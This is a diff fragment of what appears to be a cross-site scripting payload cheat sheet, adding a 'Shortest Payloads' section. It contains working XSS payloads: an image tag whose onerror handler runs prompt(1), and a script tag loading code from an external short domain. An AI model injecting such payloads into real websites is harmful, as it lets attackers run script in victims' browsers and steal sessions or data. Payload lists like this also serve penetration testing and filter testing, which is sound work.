@@ -20,6 +20,12 @@
 "><img src=x onerror=prompt(1).jpg
 ```
 
+### Shortest Payloads
+
+```markup
+<script/src=//⑮.rs
+```
+
 ### Weird Payloads
 
 ```javascript
